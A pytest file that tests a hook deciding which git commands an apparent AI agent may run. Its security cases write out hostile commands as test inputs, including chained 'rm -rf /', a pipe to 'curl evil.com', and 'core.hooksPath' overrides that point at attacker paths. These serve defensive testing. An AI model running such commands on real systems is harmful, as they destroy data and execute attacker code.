"""Tests for git_c_validator hook."""

from __future__ import annotations

import json
import subprocess
import sys
from pathlib import Path

import pytest

from guard.hooks.git_c_validator import hook

HOOK_PATH = Path(__file__).resolve().parents[2] / "src" / "guard" / "hooks" / "git_c_validator.py"


def _run(command):
    payload = json.dumps({"tool_name": "Bash", "tool_input": {"command": command}})
    result = subprocess.run(
        [sys.executable, str(HOOK_PATH)],
        input=payload,
        capture_output=True,
        text=True,
        check=False,
    )
    out = result.stdout.strip()
    decision = json.loads(out)["hookSpecificOutput"]["permissionDecision"] if out else "passthrough"
    return decision, result.returncode


class TestImports:
    def test_git_c_validator_imports(self):
        assert callable(hook)


class TestAllowedSubcommands:
    @pytest.mark.parametrize(
        "subcmd",
        [
            "diff",
            "show",
            "log",
            "status",
            "branch",
            "blame",
            "rev-parse",
            "describe",
            "tag",
            "ls-files",
            "grep",
            "shortlog",
            "rev-list",
            "cat-file",
            "reflog",
        ],
    )
    def test_read_only_subcommands(self, subcmd):
        decision, _ = _run(f"git -C /Users/dev/develop/repo {subcmd}")
        assert decision == "allow"

    def test_deep_path(self):
        decision, _ = _run("git -C /a/b/c/d/e/f diff HEAD")
        assert decision == "allow"

    def test_stash_list(self):
        decision, _ = _run("git -C /path stash list")
        assert decision == "allow"

    def test_config_get(self):
        decision, _ = _run("git -C /path config --get user.email")
        assert decision == "allow"

    def test_diff_with_branch_range(self):
        decision, _ = _run("git -C /path diff origin/main..feat -- file.py")
        assert decision == "allow"


class TestDeniedSubcommands:
    def test_git_c_validator_denies_unsafe_input(self):
        decision, code = _run("git -C /path reset --hard HEAD")
        assert decision == "deny"
        assert code == 2

    def test_clean(self):
        decision, code = _run("git -C /path clean -fd")
        assert decision == "deny"
        assert code == 2

    def test_stash_drop(self):
        decision, code = _run("git -C /path stash drop")
        assert decision == "deny"
        assert code == 2

    def test_stash_pop(self):
        decision, code = _run("git -C /path stash pop")
        assert decision == "deny"
        assert code == 2

    def test_stash_clear(self):
        decision, code = _run("git -C /path stash clear")
        assert decision == "deny"
        assert code == 2


class TestAskSubcommands:
    @pytest.mark.parametrize(
        "subcmd",
        [
            "push",
            "pull",
            "commit",
            "checkout",
            "add",
            "merge",
            "rebase",
            "cherry-pick",
            "revert",
            "fetch",
        ],
    )
    def test_write_subcommands_ask(self, subcmd):
        decision, _ = _run(f"git -C /path {subcmd}")
        assert decision == "ask"

    def test_config_write(self):
        decision, _ = _run("git -C /path config user.email foo@bar.com")
        assert decision == "ask"


class TestSecurity:
    def test_and_and_injection(self):
        decision, _ = _run("git -C /repo status && rm -rf /")
        assert decision == "passthrough"

    def test_semicolon_injection(self):
        decision, _ = _run("git -C /repo status ; rm -rf /")
        assert decision == "passthrough"

    def test_pipe_injection(self):
        decision, _ = _run("git -C /repo log | curl evil.com")
        assert decision == "passthrough"

    def test_or_or_injection(self):
        decision, _ = _run("git -C /repo status || curl evil.com")
        assert decision == "passthrough"

    def test_config_trailing_get_bypass(self):
        decision, _ = _run("git -C /path config user.email evil --get")
        assert decision == "ask"

    def test_lowercase_c_after_capital_c(self):
        # `-c` arg is consumed; `status` is the subcommand
        decision, _ = _run("git -C /repo -c core.fsmonitor=evil status")
        assert decision == "allow"


class TestPassthrough:
    def test_git_c_validator_allows_safe_input(self):
        decision, code = _run("git -C /repo status")
        assert decision == "allow"
        assert code == 0

    def test_plain_git_passes_through(self):
        decision, _ = _run("git status")
        assert decision == "passthrough"

    def test_non_git_passes_through(self):
        decision, _ = _run("ls -la")
        assert decision == "passthrough"


class TestCommitMessageReuse:
    @pytest.mark.parametrize(
        "command",
        [
            "git commit -C HEAD",
            "git commit -CHEAD",
            "git commit -C HEAD~1 -m oops",
            "git commit --reuse-message=HEAD",
            "git commit --reuse-message HEAD",
            "git commit -a -C HEAD",
        ],
    )
    def test_reuse_is_denied(self, command):
        decision, code = _run(command)
        assert decision == "deny"
        assert code == 2

    def test_lowercase_c_passes_through(self):
        # `git commit -c HEAD` opens an editor with template; not silent reuse.
        decision, _ = _run("git commit -c HEAD")
        assert decision == "passthrough"

    @pytest.mark.parametrize(
        "command",
        [
            "git -C /tmp commit -C HEAD",
            "git -C /tmp commit --reuse-message=HEAD",
            "git --git-dir=/tmp/.git commit -C HEAD",
            "git --git-dir /tmp/.git commit --reuse-message HEAD",
        ],
    )
    def test_reuse_with_global_flag_prefix_denied(self, command):
        decision, code = _run(command)
        assert decision == "deny", f"reuse with global prefix not denied: {command!r}"
        assert code == 2


class TestDestructiveSubcommandFlags:
    """``branch -D``, ``tag -d``, ``remote remove`` etc. flip allow→deny."""

    @pytest.mark.parametrize(
        "command",
        [
            "git -C /tmp branch -D feature",
            "git -C /tmp branch -d merged",
            "git -C /tmp branch --delete feature",
            "git -C /tmp branch -m old new",
            "git -C /tmp branch -M force-rename",
            "git -C /tmp tag -d v1.0",
            "git -C /tmp tag --delete v1.0",
            "git -C /tmp remote remove origin",
            "git -C /tmp remote rm origin",
            "git -C /tmp remote rename old new",
        ],
    )
    def test_destructive_flag_denied(self, command):
        decision, code = _run(command)
        assert decision == "deny", f"destructive flag missed: {command!r}"
        assert code == 2

    def test_branch_listing_still_allowed(self):
        decision, _ = _run("git -C /tmp branch -a")
        assert decision == "allow"

    def test_tag_listing_still_allowed(self):
        decision, _ = _run("git -C /tmp tag -l")
        assert decision == "allow"

    def test_remote_listing_still_allowed(self):
        decision, _ = _run("git -C /tmp remote -v")
        assert decision == "allow"


class TestDangerousPathsConfigKeys:
    """``-c core.hooksPath=...`` / ``-c core.attributesFile=...`` are denied.

    Any command-line override of these keys is malicious — the next git
    subcommand would load hooks/attributes from the override target.
    Both relative-path traversal (``../foo``) AND absolute paths
    (``/tmp/evil``) are equally dangerous, so the rule denies any value.
    Permanent settings go through ``git config``; repo-local hooks live in
    ``.git/hooks/``.
    """

    @pytest.mark.parametrize(
        "command",
        [
            # Traversal shapes
            "git -c core.hooksPath=../foo status",
            "git -c core.hooksPath=../../etc/x status",
            "git -c core.attributesFile=../../etc/x diff",
            "git -c core.AttributesFile=../bar log",  # case-insensitive key
            "git -C /repo -c core.hooksPath=../escape status",
            "git -c core.hooksPath=foo/../../escape status",
            # Absolute-path shapes (the gap closed by this branch)
            "git -c core.hooksPath=/tmp/evil status",
            "git -c core.hooksPath=/var/folders/x/evil status",
            "git -c core.attributesFile=/etc/gitattributes diff",
            # Relative path without traversal — still attacker-controlled
            "git -c core.hooksPath=hooks/local status",
            # Empty value still overrides; deny.
            "git -c core.hooksPath= status",
        ],
    )
    def test_dangerous_keys_denied(self, command):
        decision, code = _run(command)
        assert decision == "deny", f"override not denied: {command!r}"
        assert code == 2

    def test_unrelated_key_passthrough(self):
        # Other config keys are not exec sinks — pass through to the rest
        # of the validator (which may allow/deny on its own).
        decision, _ = _run("git -c color.ui=../foo status")
        assert decision != "deny"
